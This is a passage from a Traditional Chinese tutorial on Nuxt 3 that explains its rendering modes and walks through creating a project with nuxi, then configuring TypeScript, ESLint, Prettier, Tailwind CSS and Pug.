Request，整體來說是非常強大的伺服器引擎。\nNuxt 3 渲染模式 Nuxt 3 目前支援兩種渲染模式，Client-side Only Rendering 與 Universal Rendering。之後將會推出更先近的渲染模式，混合渲染 (Hybrid Rendering) 與邊緣渲染 (Edge-Side Rendering)。\nClient-side Only Rendering Nuxt 3 設定為該模式，如同單純使用 Vue 3 建置出的 SPA，瀏覽器下載並載入完 Vue 程式碼後，渲染 HTML 的所有動作皆在客戶端執行，也就是客戶端渲染 CSR。\nUniversal Rendering Universal Rendering 是 Nuxt 3 預設的渲染模式，在這個模式之下，無論頁面是預先產生並緩存還是動態渲染，Nuxt 都會在伺服器環境中執行 Vue 程式碼，並渲染 HTML，也就是如同 SSR，伺服器會向瀏覽器返回一個完整呈現的 HTML 頁面。當瀏覽器完整呈現的頁面出現後，也會開始載入 Vue 程式碼，以因應後續的動態頁面與路由跳轉等，即轉換為 SPA 開始由客戶端進行渲染。也就是說 Nuxt 3 的 Universal Rendering 即是指 SSR + SPA。\n混合渲染 (Hybrid Rendering) 我們在使用 Vue 開發 SPA 網站時，通常是會設置路由 (Route) 讓網頁能夠到達不同的頁面再來請求資料，此為 CSR。在使用 Nuxt 開發時能讓能網站擁有 SSR + SPA 的 Universal Rendering 渲染方式，除此之外，Nuxt 3 還提供了一種更先進的渲染模式——混合渲染 (Hybrid Rendering)，可以為每個路由設置不同的渲染與緩存的規則，讓部分頁面使用 CSR 在客戶端進行渲染，另一部分使用 SSR 在伺服器端進行渲染。\n邊緣渲染 (Edge-Side Rendering) Nitro 為 Nuxt 3 提供支持的全新伺服器端渲染引擎，它為 Node.js、Deno、Worker 等提供跨平台的支持，讓 Nuxt 可以在 CDN Edge Workers 進行渲染，故稱為邊緣渲染 (Edge-Side Rendering)，能有效分擔在伺服器端渲染時的資源負荷，將其提升到另一個層次，從而減少網路延遲及成本。\nNuxt 3 的建構工具 Nuxt 3 預設的建構工具如下：\n預設使用 Vite 也可以切換成 webpack Rollup PostCSS esbuild Nuxt 3 已經幫我們配置好一堆設定啦，真的是開箱即用，而且 Nuxt 也支援 TypeScript。如果說真的要調整配置，也可以再 nuxt.config 中進行調整，非常方便貼心。\n使用 nuxi 建立第一個專案 線上玩玩看 如果你還在觀望或是從隔壁棚過來的，還不想安裝相關工具與環境，那麼可以點擊下面其一連結，在 StackBlitza 或 CodeSandbox 的線上編輯器環境稍微玩玩，直接線上體驗 Nuxt 3。\nPlay on StackBlitz Play on CodeSandbox 開始建立第一個專案 先決條件 開始之前，依照 Nuxt 3 官網的起手式我們有幾個項目需要做一下檢查，我們這裡僅先注意一下 Node.js 的版本，建議使用目前最新 LTS 版本 v16.17.0 (包含 NPM v8.15.0)。\n使用 nuxi 建立 Nuxt 3 專案 nuxi 全名為 Nuxt Command Line Interface，是由 Nuxt 提供開發的標準工具，Nuxt CLI 就像是 Vue CLI 可以建立 Vue 專案，我們當然也就可以使用 Nuxt CLI 來建立 Nuxt 的專案。\n首先，打開終端機 (Terminal)，將目錄切換至自己習慣的工作區，接著輸入如下的 nuxi 提供指令並執行，來初始化建立一個 Nuxt 3 專案。在此，我們的專案名為 nuxt-app。\n1 npx nuxi init nuxt-app 如下圖，npx 會詢問你是否安裝最新版本的套件 nuxi@3.0.0-rc.10 輸入 y 即可。\n執行完指令後直到出現如下提示，代表專案已經初始建立成功，完成後可以發現目前目錄下多了一個名為 nuxt-app 的資料夾，這個資料夾也就是 Nuxt 3 專案的根目錄。\n接下來，我們可以進入專案目錄 nuxt-app。\n1 cd nuxt-app 在 nuxt-app 專案目錄下可以看到熟悉的 package.json，我們就可以開始安裝 Nuxt 3 專案的相關依賴套件。\n1 2 3 npm install # or # yarn Nuxt CLI 如同 Vue CLI 已經在建立專案時幫我們初始完成許多事情，再安裝完相關依賴套件後輸入下列指令，我們就可以在開發環境下啟動 Nuxt 了。\n1 2 3 npm run dev -- -o # or # yarn run dev -- -o 如果沒有意外，可以看到 Nitro 幫我們啟動了 Nuxt 3 的服務。\n根據提示，我們可以在瀏覽器輸入網址 http://localhost:3000/ 看看服務是否正常運作。\n如果看到如下圖的歡迎畫面，恭喜你！我們已經成功建立第一個 Nuxt 3 專案囉！\n現在你可以嘗試打開在專案目錄下的 app.vue 檔案之中，app.vue 是我們 Nuxt 專案的進入點，它的內容如下：\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 可以發現它與 Vue 3 的單一元件檔 (Single File Component, SFC) 相比，好像少了點什麼，怎麼有用了 \u0026lt;NuxtWelcome /\u0026gt; 卻沒看見在哪邊 import 的呢？\n其實呢，\u0026lt;NuxtWelcome /\u0026gt; 這個元件就是我們前面瀏覽器看到的歡迎畫面，是 Nuxt 框架自帶的一個元件，而且 Nuxt 自動導入元件的更是其特色之一，後面的系列我們會再提到自動導入 (Auto Imports)。\n在這裡直接移除 \u0026lt;NuxtWelcome /\u0026gt; 就可以了，我們將 app.vue 調整如下，並保存檔案。\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;2022 iThome 鐵人賽\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 可以看見因為 Nuxt 預設 Vite 建構並支援 HMR (Hot Module Replacement)，我們可以在瀏覽器快速的看見修改後的結果。\n至此，大家就可以先簡單的玩玩 Nuxt 3，接下來我將補充一些 nuxi 的指令與參數簡介。\nNuxt CLI 常用指令 以下將簡單介紹一些常用的指令，若您在專案目錄下記得使用 npx 來執行 nuxi。\n另外在此提醒，下面所列的指令部分參數會進行省略，若有興趣翻翻完整的指令與參數說明，可以參考 Nuxt 3 官方文件。\nnuxi init 1 npx nuxi init|create [dir] 這個 nuxi init 指令是用來初始化一個 Nuxt 專案，等同 nuxi create 指令，dir 你可以填字串作為專案與資料夾名稱，也可以填寫完整路徑來建立專案目錄。\nnuxi dev 1 npx nuxi dev [--open, -o] [--port, -p] 當我們在本地端進行開發時，需要運行開發環境，當我們執行 npm run dev -- -o 時，依據 package.json 中的 scripts 所列，其實就是在執行 nuxi dev -o，其中的 -o 表示服務啟動後開啟瀏覽器。\n如果啟動服務發現 Port 衝突，你也可以透過 -p 來將預設的監聽的 Port: 3000 調整為其他數值。\n1 2 3 nuxi dev -p 3001 # 或 # npm run dev -- -o -p 3001 nuxi cleanup 1 npx nuxi clean|cleanup nuxi cleanup 等同 nuxi clean 指令，用來刪除 Nuxt 自動產生的檔案和緩存包括：\n.nuxt .output node_modules/.vite node_modules/.cache nuxi upgrade 1 npx nuxi upgrade [--force|-f] 這個指令可以用來將目前專案的 Nuxt 3 升級至最新的版本，如果有一些可能行為調整或不相容的情況，可以再依據實際情境搭配 -f 參數來強制更新。\n如下圖，只要一行指令 npx nuxi upgrade 就可以將專案版本由 3.0.0-rc.9 升級至 3.0.0-rc.10，在 RC 階段或之後想定期升級版本來說非常好用，但也請記得升級前可以先看一下官方的 Changelog。\nNuxt 3 + TypeScript + ESLint + Prettier 環境建置 在我們使用完 Nuxt CLI 建立完專案後，其實就可以開始進行專案的開發，但是呢，相信不少人對於程式碼的排版都有自己的風格，不同人的 Coding Style 肯定也都不一樣，然而在團隊協作需要標準或為了整體一致且美觀下，Linter 就是你的好幫手，此外，TypeScript 在 Nuxt 3 已經有內建支援，我也建議及推薦使用 TypeScript，接下來分享我自己在使用 Nuxt 3 開發時的 Linter 環境配置，包含了 TypeScript、ESLint 與 Prettier。\nTypeScript 類型檢查 Nuxt 3 已經有內建支援 TypeScript，一些 TypeScript 設定都可以在專案根目錄下配置 tsconfig.json，例如，在開發過程中針對 TypeScript 我會在開發環境下啟動類型檢查，可以參考以下進行配置。\nStep 1. 安裝 VS Code 插件 首先，推薦大家安裝下列兩個 VS Code 插件：\nVue Language Features (Volar)：寫 Vue 3 強力推薦必裝的插件，包含了上色、語法提示、編輯器快速分割等強大功能，而且也是 Nuxt 3 推薦的編輯器插件。 TypeScript Vue Plugin (Volar)：Vue 的 TypeScript 插件。 Step 2. 安裝 Vue 類型檢查套件 1 2 3 npm install -D vue-tsc typescript # or # yarn add -D vue-tsc typescript Step 3. 調整 nuxt.config.ts 設定 根據 nuxt3 官方文件說明，我們可以在 nuxt.config.ts 中，設置 typescript.typeCheck: true 來讓開發時期能執行類型檢查。\n1 2 3 4 5 export default defineNuxtConfig({ typescript: { typeCheck: true } }) Step 4. 重新啟動開發環境服務 我們重新執行 npm run dev -- -o 來重啟開發環境的服務，這樣就配置完成囉！\n看看效果 如果我們在 app.vue 寫了以下程式：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: number = \u0026#39;2022\u0026#39; const title: string = `${year} iThome 鐵人賽` \u0026lt;/script\u0026gt; 可以發現終端機 (Terminal) 就指出了一個錯誤的類型指派，並告知你有錯誤程式碼的位置。\nESLint 設置 Linter ESLint 是一個 JavaScript Linter，它用來檢查 JavaScript Coding Style 的工具，主要能幫你分析並找到語法錯誤，也能用來統一風格，例如：縮排空白數、字串要用單引號或雙引號等，提醒你刪掉多餘程式碼或遵照最佳的實踐方式，確保程式碼能具有一定的水準。在團隊協作下 ESLint 更能讓大家撰寫程式碼時遵照規則，確保程式碼品質。ESLint 除了提供你可以使用大公司如 Google、Airbnb 等的規則配置來作為檢查基準，也可以客製自訂出自己喜好或團隊共識的規則來分析與提醒你校正語法。\nStep 1. 安裝 ESLint 套件 現在我們至 Nuxt 專根目錄下，開始安裝 ESLint 相關套件，當然，你也可以挑自己喜歡的進行配置，不過在這裡選擇以 Nuxt 3 官方提供的 ESLint 設定來做標準配置，並添加支援 Vue 3 的 ESLint 設定。\n1 2 3 npm install -D eslint @nuxtjs/eslint-config-typescript eslint-plugin-vue # or # yarn add -D eslint @nuxtjs/eslint-config-typescript eslint-plugin-vue Step 2. 配置 ESLint 設定檔 安裝完所需套件後，接下來我們就可以來設定 ESLint，我們在專案根目錄下建立 .eslintrc.js 檔案，內容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 module.exports = { env: { browser: true, es2021: true }, extends: [\u0026#39;@nuxtjs/eslint-config-typescript\u0026#39;, \u0026#39;plugin:vue/vue3-recommended\u0026#39;], parserOptions: { ecmaVersion: 13, sourceType: \u0026#39;module\u0026#39; }, plugins: [], rules: {}, overrides: [ { files: [ \u0026#39;**/pages/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/layouts/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/app.{js,ts,vue}\u0026#39;, \u0026#39;**/error.{js,ts,vue}\u0026#39; ], rules: { \u0026#39;vue/multi-word-component-names\u0026#39;: \u0026#39;off\u0026#39; } } ] } 在我們建立的 .eslintrc.js 檔案中 extends 可以是一個陣列，主要是來放置擴展 ESLint 的規則的配置，這裡稍微注意一下順序如下：\n@nuxtjs/eslint-config-typescript：對應 @nuxtjs/eslint-config-typescript 套件，由 Nuxt 官方提供用於 Nuxt 的 ESLint 規則配置。如果你不是使用 TypeScript 可以使用 @nuxtjs/eslint-config。\nplugin:vue/vue3-recommended：對應 eslint-plugin-vue 套件，由 Vue.js 官方提供的 ESLint 插件，包含了能配合 Vue SFC 語法及特性的規則，也可以參考官方文件，依據需求稍作調整。\n將特定目錄下的檔案關閉 vue/multi-word-component-names 規則，以此來因應 nuxt 的開發避免提示錯誤。\n因為目前 @nuxtjs/eslint-config-typescript 是基於 @nuxtjs/eslint-config 來擴展 TypeScript 的設定，而且 @nuxtjs/eslint-config 包含的是 Vue 2 的 ESLint 設定，所以我們需要再額外安裝 eslint-plugin-vue 來擴展 Vue 3 規則配置，並覆寫 vue/multi-word-component-names 規則。\n用 ESLint 來嘗試檢查 首先，我們編輯 app.vue 檔案內容如下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: number = 2022 const title: string = `${year} iThome 鐵人賽` \u0026lt;/script\u0026gt; 接著我們執行下列指令來使用 eslint 檢查 app.vue 這個檔案。\n1 npx eslint -- app.vue 可以看到下圖，ESLint 指出 app.vue 的問題，在第 9 行中的 title 這個變數已經宣告了卻沒有被使用。\n這個錯誤訊息正是依據上面我們的 ESLint 配置所被檢視出來的，在 ESLint 規則定義好後，也有分成錯誤 (Error) 與警告 (Warning)，我們可以再依據 ESLint 給予的提示進行調整與修正。\n我們嘗試修正一下 app.vue 這個檔案，在 template 中使用 title 這個變數。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: number = 2022 const title: string = `${year} iThome 鐵人賽` \u0026lt;/script\u0026gt; 再一次執行 npx eslint -- app.vue，就會發現沒有錯誤訊息產生囉！\n在 package.json 設置腳本 我們除了逐個檔案做檢查，也可以設置腳本來檢查整個專案目錄下的程式碼。\n在 package.json 的 scripts 腳本中，我們可以新增一個指令 \u0026quot;lint\u0026quot;: \u0026quot;eslint --ext .ts,.js,.vue .\u0026quot;，這樣一來我們就可以使用如下指令來檢查專案目錄下的所有包含 .ts、.js、.vue 副檔名的檔案。\n1 2 3 npm run lint # or # yarn run lint 在 VS Code 中顯示 ESLint 錯誤或警告 推薦大家安裝 VS Code 的 ESLint 插件：\nESLint：讓你在編輯器開發時就能有指令檢查，更可以做到全域或特定工作區開啟儲存或快捷鍵自動修正程式碼等設置。 安裝完畢後，建議重啟 VS Code 來重新載入相關設定。\n現在，你會發現在 VS Code 中編輯程式的過程中，如果有 ESLint 檢查到的錯誤或建議，就會出現紅色或黃色的波浪底線，當滑鼠指標移動至波浪底線處，就會發現有個小視窗提示你錯誤或警告的原因是什麼。\n在 VS Code 中自動修正 ESLint 錯誤或警告 在某些情況，ESLint 可以幫助你做自動修正程式碼，甚至在存擋時將錯誤部分直接進行修正。\n手動快速修正 我們可以在編輯器將滑鼠指標移動至波浪底線點擊「快速修正 (Quick Fix)\u0026hellip;」，你也可以使用編輯器建議的快捷鍵 Command + . (macOS)，此時就能選擇要修復或關閉略過錯誤原因；這裡我們選擇「Fix all auto-fixable problems」，來修復所有可能可以被自動修復的問題。\n存擋自動修正 除了手動快速修正外，你也可以透過添加 VS Code 的設定檔，如專案目錄下新增 .vscode/settings.json：\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;editor.formatOnSave\u0026#34;: true, \u0026#34;prettier.semi\u0026#34;: false, \u0026#34;files.trimTrailingWhitespace\u0026#34;: true, \u0026#34;editor.defaultFormatter\u0026#34;: \u0026#34;esbenp.prettier-vscode\u0026#34;, \u0026#34;editor.codeActionsOnSave\u0026#34;: { \u0026#34;source.fixAll.eslint\u0026#34;: true }, \u0026#34;eslint.format.enable\u0026#34;: true, \u0026#34;eslint.validate\u0026#34;: [\u0026#34;javascript\u0026#34;, \u0026#34;javascriptreact\u0026#34;, \u0026#34;html\u0026#34;, \u0026#34;vue\u0026#34;, \u0026#34;typescript\u0026#34;, \u0026#34;typescriptreact\u0026#34;], \u0026#34;eslint.enable\u0026#34;: false } 當我們編輯完程式碼，並保存檔案或快捷鍵存擋 Command + S (macOS)，就會觸發 ESLint 自動修復囉。\nPrettier 設置 Prettier 是程式碼格式化的工具，也可以與 ESLint 進行搭配，ESLint 與 Prettier 就能各司其職將 JaveScript 與 Vue 等檔案依照配置進行檢查與排版。\nStep 1. 安裝 Prettier 套件 我們直接安裝 prettier、eslint-config-prettier 與 eslint-plugin-prettier 三個套件。\n1 2 3 npm install -D prettier eslint-config-prettier eslint-plugin-prettier # or # yarn add -D prettier eslint-config-prettier eslint-plugin-prettier Step 2. 配置 Prettier 設定檔案 我們在專案根目錄下建立 .prettierrc.js 檔案，內容如下，這些配置都可以自己設定來配合 ESLint，更多選項或說明可以參考 Prettier 官方說明文件。\n1 2 3 4 5 6 7 8 module.exports = { printWidth: 120, // 每行文字數量達 100 字元就換到新的一行 semi: false, // 每個語句的結尾不需要分號 singleQuote: false, // 字串使用單引號，而不是雙引號 trailingComma: \u0026#34;none\u0026#34;, // 如 Object、Array 內的元素不需要尾隨逗號 endOfLine: \u0026#34;auto\u0026#34;, vueIndentScriptAndStyle: true } Step 3. 配置 ESLint 設定檔案 我們在安裝時多裝了兩個 ESLint 相關套件，分別為 eslint-config-prettier 及 eslint-plugin-prettier。\n對此我們需要將其添加至 ESLint 的 .eslintrc.js 設定檔內，在 extends 添加字串 prettier 表示使用 eslint-config-prettier 擴充配置，主要用來防止 Prettier 排版與 ESLint 發生衝突，讓其可以用來禁用 ESLint 的格式化；接著在 plugins 中添加 prettier 字串表示使用 eslint-plugin-prettier 套件擴充，讓 ESLint 可以提示我們格式有錯誤的地方。\n為了讓 Prettier 與 ESLint 有更好的搭配，在 rules 的參數中記得添加 'prettier/prettier': 'error' 讓 ESLint 可以提示 Prettier 的排版異常提示供我們做修正，至此 .eslintrc.js 設定檔應該會如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 module.exports = { env: { browser: true, es2021: true }, extends: [ \u0026#39;@nuxtjs/eslint-config-typescript\u0026#39;, \u0026#39;plugin:vue/vue3-recommended\u0026#39;, \u0026#39;prettier\u0026#39; ], parserOptions: { ecmaVersion: 13, sourceType: \u0026#39;module\u0026#39; }, plugins: [\u0026#39;prettier\u0026#39;], rules: { \u0026#39;prettier/prettier\u0026#39;: \u0026#39;error\u0026#39; }, overrides: [ { files: [ \u0026#39;**/pages/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/layouts/**/*.{js,ts,vue}\u0026#39;, \u0026#39;**/app.{js,ts,vue}\u0026#39;, \u0026#39;**/error.{js,ts,vue}\u0026#39; ], rules: { \u0026#39;vue/multi-word-component-names\u0026#39;: \u0026#39;off\u0026#39; } } ] } Step 4. 安裝 VS Code 的 Prettier 插件 Prettier - Code formatter：提供我們做程式碼的格式化，最重要的是來協助我們自動載入 .prettierrc.js 配置。 安裝完畢後，建議重啟 VS Code 來重新載入相關設定。\n我們完成了 TypeScript 與 Linter 的配置，雖然配置有些繁瑣，但寫程式的風格有個標準及規則依循，肯定能協助你寫出令人讚嘆的完美的程式碼。\n使用 Tailwind CSS 為了後續範例程式在頁面呈現上能有比較好看的樣式，原先有想過使用 UI 框架或純寫 CSS，但是總覺得好像不夠潮，所以呢，我決定帶入近年滿熱門的 CSS 框架 Tailwind CSS，在本篇文章我就不再多花篇幅介紹 Tailwind 的語法及指令等，主要針對 Nuxt 3 如何導入 Tailwind CSS 至專案內使用。\n其實有稍微糾結一下要不要使用 Master CSS，雖然最後決定先緩緩，但我認為它非常有淺力成為這類框架的霸主，大家有空也可以支持一下或玩玩這個由臺灣團隊開發的 CSS 框架哦！\nTailwind CSS 是近年滿熱門的 Utility-First CSS 框架，曾掀起一番論戰說 Class 不是讓你這樣用的之類的批評及缺點，但如果你深入暸解它後，確實不可否認它能為你帶來更好的生產效率等諸多優點。\n接下來，我會分別介紹兩種導入 Tailwind CSS 方式，分別為 Nuxt Community 釋出的 Tailwind CSS 整合模組 及 Tailwind CSS 官方指引步驟，以下的 A 或 B 兩種導入方式，大家只要擇一就可以了。\n使用 Nuxt Tailwind 模組 Step 1. 安裝相關套件 首先安裝 @nuxtjs/tailwindcss。\n1 2 3 npm install -D @nuxtjs/tailwindcss # or # yarn add -D @nuxtjs/tailwindcss Step 2. 添加模組至 nuxt.config.ts 打開 ./nuxt.config.ts 將 @nuxtjs/tailwindcss 模組添加至 modules 設定參數中，完成後看起來會像下面這樣。\n1 2 3 4 5 6 7 // https://v3.nuxtjs.org/api/configuration/nuxt.config export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/tailwindcss\u0026#39;], typescript: { typeCheck: true } }) Step 3. 重啟 Nuxt 服務 重新啟動我們的 Nuxt 服務。\n1 2 3 npm run dev -- -o # or # yarn run dev -- -o 使用 @nuxtjs/tailwindcss 只需要兩個步驟就完成了 Tailwind CSS 的配置，這個模組已經包含手動安裝時需要建立的 Tailwind CSS 指令 tailwindcss.css 需要的全域設定與 PostCSS 參數選項，同時也預設了 tailwind.config.js 的相關 content 目錄路徑，詳細可以參考 Nuxt Tailwind。\n擴充或覆寫 @nuxtjs/tailwindcss 配置 如果你沒有特別需要擴充或覆寫設定可以跳過這一段。\n專案內若使用 @nuxtjs/tailwindcss 模組，這兩個 tailwind.css 與 tailwind.config.js 檔案其實模組已經有預設，不需要手動建立，tailwind.css 對應模組內的 tailwind.css 可以參考專案檔案內容 tailwind.css，tailwind.config.js 則是透過模組動態新增配置。\n倘若想要修改也可以透過建立設定檔案來新增或覆寫預設定，例如在專案下分別建立 tailwind.css 與 tailwind.config.js 兩個檔案：\ntailwind.css 專案目錄下若存在路徑檔名一致的 ./assets/css/tailwind.css 檔案，@nuxtjs/tailwindcss 就會以這個檔案取代模組內預設的 tailwind.css 檔案。\ntailwind.css 預設內容如下：\n1 2 3 @tailwind base; @tailwind components; @tailwind utilities; 如果有成功覆蓋配置，在重啟 Nuxt 3 服務時，Terminal 會提示下列字串，表示使用了自訂的 tailwind.css。\n1 Using Tailwind CSS from ~/assets/css/tailwind.css tailwind.config.js 專案目錄下若存在 tailwind.config.js 檔案就會以新的配置拓展或覆寫 @nuxtjs/tailwindcss 預設的 tailwind.config。\n例如，我們想拓展或覆寫 content 的配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** @type {import(\u0026#39;tailwindcss\u0026#39;).Config} */ module.exports = { content: [ \u0026#39;./components/**/*.{vue,js,ts}\u0026#39;, \u0026#39;./layouts/**/*.vue\u0026#39;, \u0026#39;./pages/**/*.vue\u0026#39;, \u0026#39;./composables/**/*.{js,ts}\u0026#39;, \u0026#39;./plugins/**/*.{js,ts}\u0026#39;, \u0026#39;./app.{js,ts,vue}\u0026#39; ], theme: { extend: {} }, plugins: [] } Tailwind CSS 官方指引步驟 如果你已經使用了 @nuxtjs/tailwindcss 進行配置，則可以跳過這一段。\nStep 1. 安裝相關套件 首先進入我們的 Nuxt 專案目錄，並安裝 Tailwind CSS 會使用到的一些相關套件。\n1 2 3 npm install -D tailwindcss postcss@latest postcss-custom-properties@latest autoprefixer@latest # or # yarn add -D tailwindcss postcss@latest postcss-custom-properties@latest autoprefixer@latest Step 2. 建立 tailwind.config.js 安裝完套件後，可以執行下列指令進行初始化，完成後會在專案根目錄下產生一個名為 tailwind.config.js 的 Tailwind CSS 設定檔。\n1 npx tailwindcss init Step 3. 調整 tailwind.config.js 打開剛剛產生的設定檔 tailwind.config.js，在配置中的 content 陣列添加一些路徑，這些路徑皆是跟 Nuxt 有關的資料夾目錄與檔案，完成後檔案內容如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** @type {import(\u0026#39;tailwindcss\u0026#39;).Config} */ module.exports = { content: [ \u0026#39;./components/**/*.{vue,js,ts}\u0026#39;, \u0026#39;./layouts/**/*.vue\u0026#39;, \u0026#39;./pages/**/*.vue\u0026#39;, \u0026#39;./composables/**/*.{js,ts}\u0026#39;, \u0026#39;./plugins/**/*.{js,ts}\u0026#39;, \u0026#39;./app.{js,ts,vue}\u0026#39; ], theme: { extend: {} }, plugins: [] } Step 4. 建立 tailwind.css 接著我們在專案建立目錄 assets 與子目錄 css 用來放置 Tailwind CSS 的自定義指令，我們將其放置在 tailwind.css 供後續做使用，tailwind.css 的路徑應會是 ./assets/css/tailwind.css 檔案內容如下。\n1 2 3 @tailwind base; @tailwind components; @tailwind utilities; Step 5. 配置全域共用 CSS 上面我們建立好 tailwind.css 後，為了讓每個頁面都可以吃得到 Tailwind CSS，我們修改專案根目錄的 nuxt.config.ts 檔案，在 css 參數陣列內新增 tailwind.css 路徑，讓 Nuxt 可以配置全域共用的 CSS，並添加 postcss 選項及我們剛才安裝的套件作為插件，最後 nuxt.config.ts 檔案看起來如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // https://v3.nuxtjs.org/api/configuration/nuxt.config export default defineNuxtConfig({ postcss: { plugins: { \u0026#39;postcss-import\u0026#39;: {}, \u0026#39;tailwindcss/nesting\u0026#39;: {}, tailwindcss: {}, autoprefixer: {} } }, css: [\u0026#39;@/assets/css/tailwind.css\u0026#39;], typescript: { typeCheck: true } }) 至此，我們專案目錄檔案如下結構。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nuxt-app ├── .nuxt/ ├── assets/ │ └── css/ │ └── tailwind.css // 手動新增的檔案，用於設置 Tailwind CSS 指令並讓全部頁面引用 ├── node_modules/ ├── .eslintrc.js ├── .gitignore ├── .prettierrc.js ├── app.vue ├── nuxt.config.ts ├── package-lock.json ├── package.json ├── README.md ├── tailwind.config.js // Tailwind 初始化指令產生的設定檔 └── tsconfig.json Step 6. 重啟 Nuxt 服務 重新啟動我們的 Nuxt 服務。\n1 npm run dev -- -o 開始感受 Tailwind CSS 的魅力 當我們配置完 Tailwind CSS 並重啟 Nuxt 服務後，我們編輯 app.vue 檔案內容，撰寫以下程式碼：\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-blue-600\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-900\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 重新瀏覽一次網頁，可以發現排版、顏色、字型都有出現我們設定的效果了。\n自動排序 Tailwind CSS 的 Class 當我們在寫 Tailwind CSS 時終究會碰到類型過多，第一眼不確定是否包含某個 class，或者對於順序上有強烈統一的要求，那麼這個 Prettier 的插件，prettier-plugin-tailwindcss 插件是 Tailwind 推出的，目的在於可以使用官方推薦的 class 順序，來實現自動排序 class 來做到統一程式碼風格。\nTailwind x Prettier Step 1. 安裝插件 1 2 3 npm install -D prettier-plugin-tailwindcss # or # yarn add -D prettier-plugin-tailwindcss 如果你不是照著前面的步驟建置專案，請記得確認已經有安裝 prettier 套件。\nStep 2. 配置設定檔 開啟 .prettierrc.js 檔案，添加 'prettier-plugin-tailwindcss' 至 plugins 陣列中：\n1 2 3 4 5 6 7 8 9 module.exports = { plugins: [ \u0026#39;prettier-plugin-tailwindcss\u0026#39; ], printWidth: 100, // 每行文字數量達 100 字元就換到新的一行 semi: false, // 每個語句的結尾不需要分號 singleQuote: false, // 字串使用單引號，而不是雙引號 trailingComma: \u0026#39;none\u0026#39; // 如 Object、Array 內的元素不需要尾隨逗號 } Step 3. 自動修正效果 你可以在編輯器內移至錯誤波浪底線使用「快速修復 (Quick Fix)\u0026hellip;」功能，或設置 \u0026quot;editor.codeActionsOnSave\u0026quot; 中 \u0026quot;source.fixAll.eslint\u0026quot;: true 來達到保存後自動修正 prettier 引發的 ESLint 錯誤。\n小結 相較於 Tailwind CSS 官方指引的安裝方式，使用 Nuxt Community 幫我們整理好的 @nuxtjs/tailwindcss 模組，可以省去繁瑣的設定步驟，也解決了一些目前 Nuxt 3 專案中，導入 Tailwind CSS 使用 HMR 可能無法自動編譯並重新套用等問題。\n使用 Pug pug 為 html 模板語言，可支援撰寫 JS 邏輯。寫法上，省略了 HTML 的開、閉合標籤，能夠大大的提升工程師開發速度，看上去也更為簡潔。\n在本篇文章我依舊不再多花篇幅介紹 pug 的語法，主要針對 Nuxt 3 如何導入 pug 至專案內使用。\n為了之後開發能少打一點 Code，這邊加入 pug 到專案。\n安裝 @vite-plugin-pug 1 2 3 npm install -D vite-plugin-pug # or # yarn add -D vite-plugin-pug 直接開始體驗 Pug 直接將原先的 app.vue 改用 pug 語法來撰寫：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template lang=\u0026#34;pug\u0026#34;\u0026gt; div .bg-white.py-24 .flex-col.items-center.flex h1.text-6xl.font-semibold.text-blue-600 2022 iThome p.mt-4.text-9xl.font-bold.text-gray-900 鐵人賽 \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; const year: string = \u0026#34;2022\u0026#34; \u0026lt;/script\u0026gt; 這邊推薦一款 VS Code 的套件 - html2pug，將 HTML 反白後點選 VS Code 上方的 View \u0026gt; Command Palette\u0026hellip;，尋找並執行 \u0026quot;\u0026gt; html2pug: Transform\u0026quot;，即可將反白的 HTML 自動轉換成 pug 語法。\n不用管 HTML 的結尾符號，寫起來整個就是舒服阿~~~\n目錄結構與自動載入 (Auto Imports) 隨著整個專案的開發，目錄與元件勢必也會越來越多，如同 Vue 3 的專案可能會有專門放置元件目錄 components 等，在 Vue 3 我們可能不太需要去在意目錄的名稱，但在 Nuxt 3 的專案下，有一些目錄與名稱其實有一些基本的規定與名稱，只要照著 Nuxt 3 約定好的方式進行開發，就能更好利用 Nuxt 3 幫你完成許多貼心的功能。\nNuxt 3 的目錄結構 當我們 Nuxt CLI 建立第一個 Nuxt 3 